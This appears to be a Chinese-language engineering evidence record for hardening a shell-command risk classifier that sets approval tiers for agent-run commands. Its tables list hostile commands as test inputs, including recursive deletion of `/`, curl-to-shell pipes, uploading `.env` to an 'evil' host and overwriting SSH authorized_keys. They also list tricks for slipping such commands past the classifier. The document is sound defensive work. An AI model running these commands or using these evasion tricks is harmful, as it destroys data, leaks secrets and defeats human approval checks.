# cmdeffect-hardening · tier1 cmdEffect 词表加固(2026-08-19)

> 范围 = 把 dsh-approval-tiers 两轮对抗评审抓到的 shell 词表洞回哺进 `packages/daemon/src/tier1/cmdEffect.ts`。不改 `EffectDescriptor` / `computeRisk`、不改消费点签名、不搬 workdir、不部署常驻。
> 完成定义 = 词表加固 + 表驱动反例全绿 + 消费点回归 + evidence。本文件不自指 SHA。
> 三级词表:[ok] 本会话真实命令 / [warn] 差距如实 / [fail] 未做或沙箱受阻。

## 0. 坐标

- 工作目录:`/Users/wangyixiao/WorkSpace/saydo-batch-cmdeffect`
- 开批 HEAD:`15de970bea5b8c8e1f9718858ef6deaf0c60c740`(`docs(plan): DSH 插件线评估与 IMPL-PROMPT-9 cmdEffect 加固准备稿入库`)
- 开批提交:`de6d68539fceeadf9022b984aa023afcce4e1358`(`chore(handoff): 开批 cmdeffect-hardening`)
- 代码提交(本文件记录此 SHA,不自指):`e79d1d8101be11e3bd6051841e6a37574cd38d37`
- 回哺源:`~/WorkSpace/dsh-approval-tiers`（`src/command.ts`、`test/command.test.mjs`、`docs/PLAN.md` §2.2、`docs/evidence/review-1-fixlist.md`、`review-2-fixlist.md`）。本批施工时用的是其只读副本(gitignored,合并后不存在)。
- 评审 1 返工代码提交(本文件记录此 SHA,不自指):`068e392153d4bd571ce373dceb6adfa427290059`
- 评审 2 返工代码提交(本文件记录此 SHA,不自指):`115353e48970a8ee818d4c1cfd189dd00f11a1c9`

## 1. 回哺来源

移植源是 SayDo 自己的 `cmdEffect.ts`(2026-08-15 版,约 195 行)。dsh-approval-tiers 把它拷走后再经两轮零上下文评审,修法全部「向更保守一侧」。本批把同一套逻辑搬回,差异:

- 不 import dsh;SayDo 继续用 `@saydo/contracts` 的 `effectiveProtectedBranches`(本批未改 `policy/engine.ts`)
- **不搬 A3 workdir**:Tier1 命令在 worktree 内执行,cwd 由执行器给定,与 dsh `bash{workdir}` 不是同一缝
- 圈内 `chown`/`chgrp`/Unix `install`:dsh 定为 S1;本批旧档是未知词头 S2,只收紧圈外写出到 S3,圈内保持 S2(不放宽)

## 2. 逐条变更表(命令族 → 旧档 → 新档 → 依据)

旧档取自改码前对本文件既有 23 个 `it` 块命令的实测,以及 review 原文记录的移植源行为。新档取自本会话 `commandToEffect` + `computeRisk`。

| 命令族 | 旧档 | 新档 | 依据 |
|---|---|---|---|
| `env`/`find` 只读词头;`env FOO=1 rm -rf /`、`find . -delete` | S0 | S3(剥包装器 / `find` 变异旗标) | review-1 A1 |
| 包装器 `command`/`exec`/`nohup`/`time`/`nice`/`ionice`/`stdbuf`/`timeout` | 未知词头 S2,内层 S3 被吞 | 剥旗标后递归;空则 S2 | review-1 A1 / B1, review-2 B9 |
| 圈外写出按 argv:`tee -a ~/.bashrc`、`chmod -R 777 /`、`cp x /etc/y`、`mv x ~/y`、`ln -sf /etc/passwd ./x` | S1 | S3 `delete_data` | review-1 A2 |
| 包管理器三档:`pnpm dlx`/`yarn dlx`/`npx`/`go get`/`pip download` | 非 install 一律 S1 | S2;`npm publish` S3;`pnpm foobar` 未知动词 S2;`pnpm exec` 仍 S1 | review-1 A4, review-2 A8 |
| `npm exec` / `uv run` / `go run <module>` | S1 | S2;`go run .` / `go run ./cmd` 仍 S1 | review-2 A8 |
| `pathClass`:`rm -rf $HOME`、`>$HOME/.zshrc` | S1 | S3;`rm -rf "$DIR"` 未知变量 S2 | review-1 A5 |
| git 全局旗标:`git -C /other push origin main` | 子命令被 `-C` 挡住 → S2 | `push_branch` target `main` → S3 | review-1 A6 |
| git refspec:`+main` / `:feature` / `--delete` / `refs/heads/main` | 非 force、未归一 → S2 或漏保护分支 | force/`delete-remote-branch` S3;归一后保护分支 S3;`--force-if-includes` 单独不算 force | review-1 A6 |
| `--git-dir`/`--work-tree`/`config --file ~` | 只跳过旗标不看路径 → S1 | 圈外与 `-C` 同升;config 圈外按 `--global` S3 | review-2 A10 |
| `git push -o ci.skip origin main`、`--force-with-lease=` | `-o` 吞 refspec;lease= 不算 force → S2 | 剥带值旗标;lease 前缀匹配 → S3 | review-2 B11 |
| `git remote set-url` / `git config --global` / `git config user.email` | 一律只读 S0 | set-url S2;`--global` S3;本地写 config S1;`git remote` 查询仍 S0 | review-1 B4 |
| pipe-to-shell:`curl x \| /bin/sh`、`\| sudo sh`、`\| python`、`\| env sh` | 只认 `\| sh`/`bash` → S2 | 含路径前缀/sudo/包装器/python/node/perl/ruby/php → S3;`\| xargs rm -rf` 仍 S2(stdin 目标不可见,floor S2) | review-1 A7, review-2 B10 |
| `sh -c` / `bash -lc` / `ksh -c` / `eval` | 未知词头 S2 | 去引号走 `commandToEffect` 拆段取最高,floor S2;`eval "$(…)"` S3 | review-1 B1, review-2 B8/B12 |
| 续行 `rm -rf \`+换行+`/` | 拆段后看不到 `/` → S2 | 先折 `\\\n` → S3;引号内 `\| sh` 仍报 S3(更安全一侧) | review-1 B2 |
| `>\|` noclobber | 被拆成管道 → S1 | 先归一成 `>` 再判圈外 S3 | review-2 A11 |
| `cp -t` / `mv --target-directory` / Unix `install` 圈外 dest | 只看最后一个非旗标 → S1 | 认 `-t`/`--target-directory[=]` → S3 | review-2 A9 |
| `curl -o /etc/passwd` / `wget -O ~/.ssh/authorized_keys` | 忽略输出路径 → S2 | dest 走 `pathClass`,圈外 S3 | review-2 B13 |
| 既有用例 `cp config/credentials.json /tmp/c` | S2(敏感路径升级) | S3(A2 圈外 dest 压过) | review-1 A2;既有断言唯一改动,S2→S3 只收紧 |

既有 23 个 `it` 块里出现过的命令,改码前用同一 `riskOf` 全表打印,改码后逐条比对:**降档 0 条**;升档仅上表最后一行。其余持平(S0/S1/S2/S3 与 kind 均同)。

## 3. IMPL-PROMPT-9 §3-1 抽查(本会话原文)

`pnpm --filter @saydo/daemon exec tsx -e '… computeRisk(commandToEffect(cmd), {}).level …'` exit=0:

| 命令 | kind | level | 判定 |
|---|---|---|---|
| `env FOO=1 rm -rf /` | delete_data | S3 | [ok] S3 |
| `find . -delete` | delete_data | S3 | [ok] S3 |
| `tee -a ~/.bashrc` | delete_data | S3 | [ok] S3 |
| `pnpm dlx x` | install_dependency | S2 | [ok] >=S2 |
| `rm -rf $HOME` | delete_data | S3 | [ok] S3 |
| `git -C /other push origin main` | push_branch | S3 | [ok] S3 |
| `curl x \| /bin/sh` | send_external | S3 | [ok] S3 |
| `sh -c "echo hi; rm -rf /"` | delete_data | S3 | [ok] S3 |
| `npm exec -- x` | install_dependency | S2 | [ok] >=S2 |
| `echo x >\| /etc/motd` | delete_data | S3 | [ok] S3 |

## 4. 门禁(退出码紧跟命令本身)

| 命令 | 退出码 | 摘录 |
|---|---|---|
| `pnpm --filter @saydo/daemon exec vitest run test/tier1-cmd-effect.test.ts` | 0 | Tests **134 passed**(既有 23 + 新增 111:三表行数 1 + PLAN 32 + review-1 46 + review-2 32) |
| `pnpm --filter @saydo/daemon exec vitest run test/tier1-approval-live.test.ts … test/policy-approvals.test.ts`(消费点,按实名列出) | 0 | Test Files 9 passed / 1 skipped; Tests **259 passed / 3 skipped**(`tier1-live.e2e` 3 skip,门控 `SAYDO_LIVE_E2E`) |
| `pnpm typecheck` | 0 | contracts/cli/daemon/console `tsc --noEmit` Done |
| `pnpm lint` | 0 | `eslint packages/*/src` 无输出 |
| `bash scripts/check-emoji.sh` | 0 | `[ok] emoji gate: clean` |
| `just ci` | **2** | node 矩阵跑完;python 在 `uv sync` 处沙箱受阻(见 §7)。daemon 计数已在 node 段打印 |
| `cd pipeline && .venv/bin/python -m ruff check .` | 0 | `All checks passed!`(既有 venv;不是 `just ci` 本体) |
| `cd pipeline && .venv/bin/python -m pytest -q` | 0 | **33 passed** in 0.27s(既有 venv;不是 `just ci` 本体) |

`just ci` node 段 daemon 摘录(本会话):`Test Files 105 passed | 2 skipped (107)` / `Tests 1411 passed | 4 skipped (1415)`。

基线(overlay / remote-mobile-w0 evidence):daemon **1300 passed | 4 skipped**。本批新增 111 条 vitest 用例。1411 = 1300 + 111。[ok] 计数对齐。

## 5. 未搬项

| 项 | 理由 |
|---|---|
| dsh A3 `bash`/`pwsh` `workdir` | IMPL-PROMPT-9 红线:SayDo Tier1 cwd 由执行器给定,workdir 语义不同,明确不搬 |
| dsh B3/B5/B6 插件测试与 `str_replace_editor`/`realpath` | 不在 `cmdEffect.ts`;SayDo 消费点是 executor/approvalFlow,本批不改签名 |
| dsh C3 监听器 catch 分类异常 | dsh 插件宿主路径,SayDo 无对应 listener |
| 圈内 `chown`/`chgrp`/Unix `install` 降到 S1 | 会放宽旧档(未知词头 S2);本批只收紧圈外写出 |

## 6. 待 owner 裁决

加固把若干**登记 verify 之外**的常用命令升到 S2(须确认一句)。本批**未**加白名单。`pnpm exec <本地 bin>` 仍 S1,未打断该路径。

| # | 命令 | 现判(相对 15de970 同或已升) | 说明 |
|---|---|---|---|
| O-1 | `cmd 2>/dev/null`、`echo hi > /dev/null`、`node x.js 1>/dev/null`、`echo x >/dev/stderr` | owner 2026-08-19 批准,已实施,代码 `adc2b9a88364df8f43198f856fa3cdd35f06adb2` | 重定向目标 `/dev/(null\|stdout\|stderr\|tty\|fd/N)` 不再算圈外写;argv 的 `cp x /dev/null` 未改 |
| O-2 | `git config --global --get user.name` | S3 | `--get*`/`--list` 与 `--global` 同现是只读;放宽与否 owner 定 |
| O-3 | `rm -rf .`、`rm -rf ./`、`git clean -fdx`、`git reset --hard` | S1 | 圈内可逆写的定义下是 S1,但删整个 worktree 是否该 S2 留 owner |
| O-4 | `uv run …` | S2(改前 S1) | Python 项目/本仓 pipeline 侧常见入口 |
| O-4 | `npm exec -- <pkg>` | S2(改前 S1) | 与 `pnpm exec`(仍 S1)不同档,A8 必修 |
| O-4 | `pnpm dlx` / `yarn dlx` / `npx` / `bunx` / `pipx` | S2(改前 S1) | 一次性拉包执行,A4 必修 |
| O-4 | `go run github.com/…` | S2(改前 S1) | 远程 module;本地 `go run .`/`./cmd` 仍 S1 |
| O-4 | `pnpm <未知动词>` 如 `pnpm foobar` | S2(改前 S1) | 未知动词 fail-closed,A4 必修 |

若 dogfood 要放回 S1 或按 O-1/O-2/O-3 放宽,须 owner 点名,实施方不自行放宽。

## 7. 沙箱受阻

`just ci` 的 `ci-python` 原文:

```
error: Failed to initialize cache at `/Users/wangyixiao/.cache/uv`
  Caused by: failed to open file `/Users/wangyixiao/.cache/uv/sdists-v9/.git`: Operation not permitted (os error 1)
error: recipe `ci-python` failed on line 28 with exit code 2
```

未写 `.npmrc`、未改 uv 缓存路径。node 矩阵(typecheck/lint/pnpm test/emoji/color/migration-tools)已在同一次 `just ci` 内跑完。python 用既有 `pipeline/.venv` 另跑 ruff+pytest 作旁证(§4),调度方须在沙箱外复跑完整 `just ci`。

## 8. 明确未做

- 未改 `packages/daemon/src/tier1/executor.ts` / `approvalFlow.ts` 调用签名
- 未改 `packages/daemon/src/policy/engine.ts`
- 未改 canonical
- 未 `just daemon deploy` / `just dev` / 未碰 `~/.saydo`
- 未 push / 未切分支
- 评估线(零上下文 Codex 对抗评审)本会话没做

- journal 轮次索引节未随本批入库:主仓 `history/PROCESS-JOURNAL.md` 的 R75 已被同日官网重建会话占用(其改动尚未提交,不能碰),本批的轮次节(拟编 R76,内容 = 本文件 §0–§10 的索引)待该会话入库后补记;本文件与 HANDOFF 第 21 行已是完整真相,不受影响。

## 9. 评审 1(2026-08-19)与返工

返工代码提交:`068e392153d4bd571ce373dceb6adfa427290059`(不自指)。依据 = 本文件本节(评审 1 的 A/B/C 表)。既有用例一字未改。降档扫描(改前 `15de970` vs 返工 1 后,tsx 同时加载两版 `commandToEffect` + 同一 `computeRisk`):比对 **220** 条,**降档 0**,升档 97,持平 123。

### A/B/C 逐条

反例均在 `packages/daemon/test/tier1-cmd-effect.test.ts` 的 `describe("评审 1 返工")` / `A/B/C 反例与对照`。

| # | 命令(现判 → 应判) | 处置 | 反例位置 |
|---|---|---|---|
| A-1 | `git -c core.pager='rm -rf /' log` S0→S3;`git -c core.fsmonitor=./evil.sh status` S3;`git -c diff.external=evil diff` S3;`git -c core.hooksPath=/tmp/hooks commit -m x` S3;`git -C . status` S2(改前 S2,持平) | 完成:任一 git 全局旗标 floor S2;-c exec 键或 val 含 `!` → `delete_data` S3;`applyCOutside` 保留 | 评审 1 返工:`git -c core.pager='rm -rf /' log` 等 5 条 |
| A-2 | `sed --in-place 's/a/b/' ~/.zshrc` S3;`sed --in-place=.bak … /etc/hosts` S3 | 完成:`--in-place`/`--in-place=` 与 `-i` 同判 | 评审 1 返工:上述 2 条 |
| A-3 | `awk 'BEGIN{system("rm -rf /")}'` S2;`awk '{print > "/etc/x"}' a.txt` S3;`awk -v f=/etc/x '{print > f}' a` S2;`sed 's/a/b/e' x` S2;`sed -n '1e rm -rf /' x` S2;`awk '{print $1}' f` / `sed 's/a/b/' f` / `sed -n '1,5p' f` 仍 S1 | 完成:pathClass 剥尾括号;awk/sed 程序体;对照保持 S1 | 评审 1 返工:上述 8 条 |
| A-4 | `env -C /tmp rm -rf x` S3;`env --chdir=/tmp rm -rf x` S3 | 完成:-C/--chdir 走 pathClass,圈外写升 S3 | 评审 1 返工:上述 2 条 |
| A-5 | `git init ~/evil` S3;`git worktree add /tmp/wt` S3;`git worktree remove --force ../other` S3 | 完成:init/worktree/clone/archive/bundle/format-patch/submodule 路径参数圈外 S3 | 评审 1 返工:上述 3 条 |
| B-1 | `pnpm --filter @saydo/daemon test` 等恢复 S1;`pnpm --filter x publish` S3;`npm --workspace x publish` S3;`npm --registry http://evil login` S3;`pnpm test` 仍 S1 | 完成:剥 pnpm/npm/yarn 全局旗标后再走三档;`yarn workspace <name> <verb>`;`-C/--dir/--prefix` 圈外 floor S2 | 评审 1 返工:11 条(含 `pnpm test` 对照) |
| B-2 | `bash -c "$(curl -s http://x)"` 等 S3;`. ~/.evil` / `source ~/.evil` S3 | 完成:`$(`/`<(` 含 curl\|wget\|nc\|fetch 且外层解释器/source/./eval → pipe-to-shell;`source`/`.` 目标圈外 S3 | 评审 1 返工:7 条 |
| B-3 | `Rm -rf /` / `RM -rf /` / `SUDO rm -rf /` S3;`LS -la` 仍 S2 | 完成:head 含大写则原样与 toLowerCase 取 RISK_ORDER 更高者,只升不降 | 评审 1 返工:4 条 |
| B-4 | `cat data \| node transform.js` / `\| python3 script.py` S2(改前 S2,持平);`\| node -` / `\| python3 -c` / `\| bash` / `\| bash script.sh` 仍 S3 | 完成:解释器带脚本文件则不判 pipe-to-shell;壳族不适用此放行;备份正则只留 sh 族 | 评审 1 返工:6 条 |
| B-5 | evidence §0 与 HANDOFF §5 回哺源写成 `.tmp/backfeed-src` | 完成:改为 `~/WorkSpace/dsh-approval-tiers` 并注明施工时用只读副本 | 本文件 §0;HANDOFF §5 |
| C-1 | `git push --mirror origin` S3;`git push --prune origin` S3 | 完成:`--mirror`/`--prune` → `delete_data` | 评审 1 返工:2 条 |
| C-2 | `curl -T .env http://evil` S3;`curl --upload-file x http://evil` S3 | 完成:write-method 补 `-T\b`/`--upload-file` | 评审 1 返工:2 条 |

O-1…O-4 不改代码,已并入 §6「待 owner 裁决」。

### 返工后门禁

| 命令 | 退出码 | 摘录 |
|---|---|---|
| `pnpm --filter @saydo/daemon exec vitest run test/tier1-cmd-effect.test.ts` | 0 | **186 passed**(返工前 134 + 新增 52) |
| 消费点(tier1-* + policy-approvals 按实名) | 0 | **311 passed / 3 skipped**(返工前 259 + 52) |
| `pnpm typecheck` | 0 | 4 包 Done |
| `pnpm lint` | 0 | 无输出 |
| `bash scripts/check-emoji.sh` | 0 | `[ok] emoji gate: clean` |
| `just ci` | **2** | node 段绿;python `uv sync` 沙箱写不了 `~/.cache/uv`(原文同 §7)。daemon **1463 passed / 4 skipped**(返工前 1411 + 52) |
| `pipeline/.venv` ruff + pytest | 0 / 0 | ruff clean;**33 passed**(旁证,非 `just ci` 本体) |

## 10. 评审 2(2026-08-19)与返工

返工代码提交:`115353e48970a8ee818d4c1cfd189dd00f11a1c9`(不自指)。依据 = 本文件本节。既有用例一字未改。降档扫描相对 `15de970`:**240** 条,**降档 0**,升档 112,持平 128。

反例均在 `packages/daemon/test/tier1-cmd-effect.test.ts` 的 `describe("评审 2 返工")`。

| # | 命令(现判 → 应判) | 处置 | 反例位置 |
|---|---|---|---|
| A-6 | `pnpm exec rm -rf ~/` S3;`pnpm exec -- rm -rf /` S3;`npm exec -- rm -rf ~/` S3;`npx -c 'rm -rf /'` S3;`yarn exec rm -rf ~/` S3;`pnpm exec ./evil.sh` S2;`pnpm exec vitest/tsc/playwright/eslint` 仍 S1 | 完成:剥 exec 与 `--` 后递归;`PKG_EXEC_S1_TOOLS` 且非 S3 面 → S1;未知词头 floor S2;`npx -c`/`--call` 取 max(S2, inner)。**tsx/ts-node 未进 S1 表**(与 08-15 把 tsx 移出 S1 同理,`pnpm exec tsx` 走 S2) | 评审 2 返工:10 条 |
| B-6 | `git -c 'core.pager=rm -rf /' log` S3 | 完成:-c 值先 unquote 再拆 key | 评审 2 返工:该条 |
| B-7 | `cat x \| NODE -` S3;`cat x \| Python3 -` S3 | 完成:rhs 词头 toLowerCase 再判解释器 | 评审 2 返工:2 条 |
| B-8 | `npm --prefix /other install` S3;`pnpm -C /other test` S3 | 完成:圈外目录时非只读动词 `delete_data`;只读动词 floor S2 | 评审 2 返工:2 条 |
| B-9 | `rm -rf ${HOME}` S3 | 完成:剥尾括号前先判 `~`/`$HOME`/`${HOME}` 前缀 | 评审 2 返工:该条 |
| B-10 | `git --exec-path=/tmp/evil status` S3 | 完成:圈外 `--exec-path` 按 exec 面 `delete_data` | 评审 2 返工:该条 |
| C-3 | `\rm -rf /etc` S3 | 完成:剥前导 `\` 后与原词头取高 | 评审 2 返工:该条 |
| C-4 | `gsed -i 's/a/b/' ~/.zshrc` S3;`gsed 's/a/b/' f` 仍 S2 | 完成:仅对登记的 g 前缀 coreutils 取高,不剥 `git` | 评审 2 返工:2 条 |
| C-5 | evidence §9 仍写 `.tmp/review-1-fixlist.md` | 完成:§9 改为依据=本文件该节 | 本文件 §9 |

已知摩擦(不改代码):`git -c core.editor=vim commit` S3 是 fail-closed(core.editor 在 exec 键表),可接受。F2/`cmd 2>/dev/null` 已随 O-1 落地。

### 评审 2 后门禁

| 命令 | 退出码 | 摘录 |
|---|---|---|
| `pnpm --filter @saydo/daemon exec vitest run test/tier1-cmd-effect.test.ts` | 0 | **206 passed**(评审 1 后 186 + 20) |
| 消费点(tier1-* + policy-approvals 按实名) | 0 | **331 passed / 3 skipped**(311 + 20) |
| `pnpm typecheck` | 0 | 4 包 Done |
| `pnpm lint` | 0 | 无输出 |
| `bash scripts/check-emoji.sh` | 0 | `[ok] emoji gate: clean` |
| `just ci` | **2** | node 段绿;python `uv sync` 沙箱写不了 `~/.cache/uv`(原文同 §7)。daemon **1483 passed / 4 skipped**(1463 + 20) |
| `pipeline/.venv` ruff + pytest | 0 / 0 | ruff clean;**33 passed** |

## 11. O-1 `/dev` sink 落地(owner 2026-08-19 批准)

代码提交:`adc2b9a88364df8f43198f856fa3cdd35f06adb2`(不自指)。只改重定向解析,不改 `pathClass`。

相对 `cb2fba8` 降档扫描 257 条:降档 **10**,全部重定向目标在 `/dev/(null|stdout|stderr|tty|fd/N)` 集合内;升档 0;意外降档 0。

| 命令 | 旧档 | 新档 |
|---|---|---|
| `cmd 2>/dev/null` | S3 | S2 |
| `ls 2>/dev/null` | S3 | S0 |
| `git status 2>/dev/null` | S3 | S0 |
| `rg -n foo 2>/dev/null` | S3 | S0 |
| `echo hi > /dev/null` | S3 | S1 |
| `pnpm test > /dev/null 2>&1` | S3 | S1 |
| `node x.js 1>/dev/null` | S3 | S2 |
| `echo x >/dev/stderr` | S3 | S1 |
| `echo x > /dev/tty` | S3 | S1 |
| `echo x >/dev/fd/2` | S3 | S1 |

### O-1 门禁

| 命令 | 退出码 | 摘录 |
|---|---|---|
| `pnpm --filter @saydo/daemon exec vitest run test/tier1-cmd-effect.test.ts` | 0 | **223 passed**(1483 基线用例文件 206 + 17) |
| 消费点(tier1-* + policy-approvals 按实名) | 0 | **348 passed / 3 skipped** |
| `pnpm typecheck` | 0 | 4 包 Done |
| `pnpm lint` | 0 | 无输出 |
| `bash scripts/check-emoji.sh` | 0 | `[ok] emoji gate: clean` |
| `just ci` | **2** | node 段绿;python `uv sync` 沙箱写不了 `~/.cache/uv`(原文同 §7)。daemon **1500 passed / 4 skipped**(1483 + 17) |
| `pipeline/.venv` ruff + pytest | 0 / 0 | ruff clean;**33 passed** |


